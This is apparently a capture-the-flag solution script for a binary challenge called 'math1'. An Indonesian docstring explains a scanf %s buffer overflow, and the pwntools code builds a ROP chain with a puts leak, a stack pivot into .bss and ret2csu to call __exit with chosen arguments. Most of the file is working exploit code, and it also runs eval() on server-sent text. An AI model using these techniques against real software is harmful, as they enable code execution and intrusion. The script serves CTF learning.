"""
Vuln : terdapat fungsi input scanf dengan parameter %s. Ini menyebabkan scanf menerima input tanpa batasan dan menyebabkan buffer overflow.
Selanjutnya terdapat fungsi __exit yang menerima tiga parameter. Jika semua parameter benar, maka flag akan diberikan.

Terdapat dua solusi untuk soal ini. file ini merupakan solusi pertama

Parameter pertama dan kedua berupa nilai biasa, yang bisa kita masukkan ke register secara langsung
Parameter ketiga berupa pointer string 's'. karena string tersebut di load saat fungsi init(),
kita harus melakukan leak pointer 's' yang berada di heap menggunakan puts
setelah melakukan leak kita panggil scanf untuk menuliskan payload berikutnya ke segmen .bss.
selanjutnya kita panggil gadget pop rsp untuk melakukan pivoting register rsp ke segmen .bss tempat payload berikutnya
Payload ini berisi ROP untuk memanggil fungsi exit.
Jika saat scanf dipanggil (atau fungsi apapun yang melibatkan register xmm) menyebabkan SIGSEGV,
maka kita lakukan align stack ke 16 bytes (kelipatan 0x10 (0x10, 0x20, ...dst)) dengan gadget ret atau sesuaikan lokasi stack menjadi kelipatan 0x10
(selengkapnya https://stackoverflow.com/questions/51070716/glibc-scanf-segmentation-faults-when-called-from-a-function-that-doesnt-align-r)

Untuk memasukkan 2 parameter ke RDI dan RSI, kita dapat memakai gadget pop rdi dan rsi yang dapat dicari dengan ROPgadget.
Untuk parameter RDX kita bisa memakai teknik ret2csu pada __libc_csu_init.
Parameter RDX dimasukkan di tengah program __libc_csu_init dan selanjutnya terdapat pemanggilan fungsi dari register [R15+RBX*8].
R15 dapat diisi dengan address _DYNAMIC yang mengandung address fungsi fini yang tidak akan mengubah nilai register saat dipanggil sehingga aman untuk digunakan.
"""

from pwn import *

# r = process("./math1")
# attach(r, '''
# b*0x0000000000401801
# b*__exit+33
# c
# ''')

r = remote('0.0.0.0', 17073)
b = ELF("./math1", checksec=False)

r.recvline()
for i in range(100):
    a = r.recvuntil(" = ")[:-3]
    r.sendline(str(eval(a)))
    # print a, eval(a)

pop_rdi = 0x000000000040186b # : pop rdi ; ret
pop_rsi = 0x0000000000401869 # : pop rsi ; pop r15 ; ret
pop_r = 0x0000000000401862 # : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_rsp = 0x0000000000401865 # : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
dat = 0x404940 # : @data
fini = 0x403da8
sub_add_rsp = 0x0000000000401874
scanfs = 0x40305b
ex = 0x4011f2
ret = 0x0000000000401016

p = 'A'*264

# puts(s);
p += p64(pop_rdi) # pop rdi
p += p64(b.symbols['s'])
p += p64(b.symbols['puts'])

# align stack to 0x10
p += p64(ret) 

# scanf("%s", @data)
p += p64(pop_rsi) # pop rsi r15
p += p64(dat)
p += p64(0)
p += p64(pop_rdi) # pop rdi
p += p64(scanfs)
p += p64(b.plt['__isoc99_scanf'])

# pivoting RSP
p += p64(pop_rsp) # pop rsp r13-15
p += p64(dat-0x18)

# leak variabel 's'
r.sendlineafter('> ', p)
l = r.recvline()[:-1]
l = u64(l.ljust(8, '\0'))
print hex(l)

# ret2csu
p = ''
p += p64(pop_r) # pop rbx rbp r12-15 ; ret
p += p64(0) # rbx
p += p64(1) # rbp
p += p64(0xdeeeaaadcafebeef) # r12 -> edi
p += p64(0xffffff92) # r13 -> rsi
p += p64(l) # r14 -> rdx
p += p64(fini) # r15 -> call [fini]
p += p64(pop_r-26)

# padding untuk pop di __libc_csu_init
p += p64(0)*7

# sesuaikan rdi lagi karena ret2csu tadi hanya mengcopy 32bit r12 saja (r12d ke edi)
p += p64(pop_rdi) # pop rdi
p += p64(0xdeeeaaadcafebeef)

# panggil fungsi __exit
p += p64(b.symbols["__exit"]) # __exit

r.sendline(p)

print r.recvuntil("}")
r.close()


